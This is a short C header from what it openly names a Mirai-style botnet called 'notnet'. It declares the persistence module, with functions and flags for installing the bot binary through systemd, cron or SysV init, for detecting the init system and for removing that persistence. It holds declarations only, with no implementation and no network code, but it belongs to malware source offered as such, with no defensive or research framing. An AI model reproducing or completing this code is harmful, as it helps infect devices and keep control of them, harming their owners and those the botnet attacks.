/*
 * notnet - Modern Mirai-Style Botnet
 * persist.h - Persistence module (systemd, cron, SysV init)
 */
#ifndef NOTNET_PERSIST_H
#define NOTNET_PERSIST_H

#include "protocol.h"

/* Persistence targets */
#define PERSIST_SYSTEMD   0x01
#define PERSIST_CRON      0x02
#define PERSIST_SYSV      0x04

/* ── Functions ───────────────────────────────────────────────── */
int detect_init_system(void);
int persist_install(notnet_bot_t *bot);
int remove_persistence(void);
int install_systemd(const char *bin_path);
int install_cron(const char *bin_path);
int install_sysv(const char *bin_path);
int get_persist_path(char *buf, int len);

#endif /* NOTNET_PERSIST_H */
